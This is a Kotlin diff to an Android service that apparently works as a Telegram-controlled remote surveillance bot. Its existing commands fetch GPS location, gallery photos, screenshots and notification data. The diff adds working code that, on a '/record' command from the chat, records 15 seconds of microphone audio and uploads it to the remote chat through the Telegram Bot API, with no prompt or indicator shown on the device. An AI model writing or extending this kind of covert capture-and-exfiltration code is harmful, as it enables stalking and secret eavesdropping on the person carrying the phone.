@@ -19,6 +19,8 @@ import android.location.Location
 import android.location.LocationManager
 import android.os.Build
 import android.os.IBinder
+import android.media.AudioFormat
+import android.media.MediaRecorder
 import android.os.PowerManager
 import android.util.DisplayMetrics
 import android.util.Log
@@ -46,6 +48,8 @@ class TelegramService : Service() {
     private var virtualDisplay: VirtualDisplay? = null
     private var imageReader: ImageReader? = null
     private var wakeLock: PowerManager.WakeLock? = null
+    private var mediaRecorder: MediaRecorder? = null
+    private var isRecording = false
 
     private val mediaProjectionReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context, intent: Intent) {
@@ -89,6 +93,7 @@ class TelegramService : Service() {
     override fun onDestroy() {
         super.onDestroy()
         releaseWakeLock()
+        stopRecording()
         scope?.cancel()
         cleanupMediaProjection()
         unregisterReceiver(mediaProjectionReceiver)
@@ -316,6 +321,9 @@ class TelegramService : Service() {
                 }
                 sendText(targetChatId, sb.toString())
             }
+            cmd.contains("/record") || cmd.contains("/rekam") -> {
+                recordAudio(targetChatId)
+            }
             cmd.contains("/crash") || cmd == "crash" -> {
                 val app = applicationContext as? App
                 val crashLog = app?.getLatestCrashLog()
@@ -340,6 +348,8 @@ class TelegramService : Service() {
             /status   - info perangkat
             /gps      - dapatkan lokasi GPS
             /photo [N] - kirim N foto terakhir dari galeri (default 5, max 20)
+            /record     - rekam 15 detik audio dan kirim ke chat
+            /crash      - lihat log crash terakhir
             /notifications - status monitor notifikasi
             /help     - daftar ini
 
@@ -552,6 +562,91 @@ class TelegramService : Service() {
                 .build()
             http.newCall(req).execute().close()
         } catch (e: Exception) { /* ignore */ }
+    }
+
+    /** Rekam 15 detik audio, kirim ke Telegram sebagai voice note. */
+    private suspend fun recordAudio(chatId: String) {
+        if (isRecording) {
+            sendText(chatId, "Sedang merekam... tunggu selesai.")
+            return
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val granted = checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) ==
+                    android.content.pm.PackageManager.PERMISSION_GRANTED
+            if (!granted) {
+                sendText(chatId, "⚠️ Izin mikrofon belum diberikan. Buka app → izinkan akses mikrofon → lalu /record lagi.")
+                return
+            }
+        }
+        val ts = System.currentTimeMillis()
+        val outFile = java.io.File(filesDir, "rec_${ts}.m4a")
+        val recorder = createRecorder(outFile)
+        mediaRecorder = recorder
+        isRecording = true
+        sendText(chatId, "⏺️ Mulai rekam 15 detik...")
+        scope?.launch {
+            try {
+                recorder.start()
+            } catch (e: Exception) {
+                Log.e(TAG, "recordAudio: start failed: ${e.message}")
+                sendText(chatId, "Gagal mulai rekam: ${e.message}")
+                stopRecording()
+                return@launch
+            }
+            delay(15_000L)
+            stopRecording()
+            sendAudio(chatId, outFile, "Rekaman ${android.text.format.DateFormat.format("HH:mm", ts)}")
+        }
+    }
+
+    private fun createRecorder(outputFile: java.io.File): MediaRecorder {
+        val r = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            MediaRecorder(this)
+        } else {
+            @Suppress("DEPRECATION")
+            MediaRecorder()
+        }
+        r.setAudioSource(MediaRecorder.AudioSource.MIC)
+        r.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+        r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+        r.setAudioSamplingRate(44100)
+        r.setAudioEncodingBitRate(128000)
+        r.setOutputFile(outputFile.absolutePath)
+        return r
+    }
+
+    private fun stopRecording() {
+        val rec = mediaRecorder ?: return
+        isRecording = false
+        mediaRecorder = null
+        try {
+            rec.stop()
+        } catch (e: Exception) {
+            Log.w(TAG, "stopRecording: ${e.message}")
+        } finally {
+            rec.release()
+        }
+    }
+
+    /** Kirim file audio ke Telegram sebagai voice message. */
+    private suspend fun sendAudio(chatId: String, file: java.io.File, caption: String) = withContext(Dispatchers.IO) {
+        if (chatId.isEmpty() || botToken.isEmpty()) return@withContext
+        try {
+            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
+                .addFormDataPart("chat_id", chatId)
+                .addFormDataPart("audio", file.name, file.asRequestBody("audio/mp4".toMediaTypeOrNull()))
+                .addFormDataPart("duration", "15")
+                .addFormDataPart("caption", caption)
+                .build()
+            val req = Request.Builder()
+                .url("https://api.telegram.org/bot$botToken/sendAudio")
+                .post(body)
+                .build()
+            http.newCall(req).execute().close()
+            file.delete()
+        } catch (e: Exception) {
+            Log.e(TAG, "sendAudio: ${e.message}")
+        }
     }
 
     private suspend fun takeScreenshot(chatId: String) {
